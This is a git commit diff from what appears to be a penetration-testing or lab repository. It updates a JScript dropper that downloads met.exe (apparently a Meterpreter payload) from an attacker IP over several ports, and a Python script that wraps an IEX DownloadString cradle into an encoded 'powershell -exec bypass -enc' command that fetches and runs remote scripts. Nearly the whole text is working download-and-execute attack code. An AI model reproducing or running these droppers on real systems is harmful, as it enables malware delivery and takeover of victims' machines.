b565eecb2c9d3b0f3f2fe236e9d5231bc5e8cd54
Emanuele Picariello <emanuelepicariello97@gmail.com>
2024-06-08 14:29:57 -0400

    update

--- DropperJscript/script.js
+++ DropperJscript/script.js
@@ -1,8 +1,36 @@
-var url = "http://192.168.45.206/met.exe"
+var url = "http://192.168.49.70/met.exe"
+var url1 = "http://192.168.49.70:4444/met.exe"
+var url2 = "http://192.168.49.70:8080/met.exe"
+var url3 = "http://192.168.49.70:8081/met.exe"
+var url4 = "http://192.168.49.70:8090/met.exe"
+var url5 = "http://192.168.49.70:443/met.exe"
+var url6 = "http://192.168.49.70:445/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 Object.Open('GET', url, false);
 Object.Send();
+
+
+Object.Open('GET', url1, false);
+Object.Send();
+
+Object.Open('GET', url2, false);
+Object.Send();
+
+Object.Open('GET', url3, false);
+Object.Send();
+
+Object.Open('GET', url4, false);
+Object.Send();
+
+Object.Open('GET', url5, false);
+Object.Send();
+
+Object.Open('GET', url6, false);
+Object.Send();
+
+
+
 
 if (Object.Status == 200)
 {
--- GenerationPayload/EncryptPowershell/scriptPowershell.py
+++ GenerationPayload/EncryptPowershell/scriptPowershell.py
@@ -5,7 +5,8 @@ import base64
 #payload =  'Test-Connection -ComputerName 192.168.49.115 -Count 2 -Quiet'
 #payload = 'Test-Connection -ComputerName 192.168.49.115 -Count 2 -Quiet'
 #payload = "IEX(New-Object Net.webclient).downloadString('http://192.168.45.250/Candlestick.ps1'); IEX(New-Object Net.webclient).downloadString('http://192.168.45.250/drop.ps1')"
-payload = "IEX(New-Object Net.webclient).downloadString('http://192.168.45.250/payload64.txt')" 
+#payload = "IEX(New-Object Net.webclient).downloadString('http://192.168.49.70/payload64.txt')" 
+payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/test.ps1')"
 
 cmd = "powershell.exe -exec bypass -enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
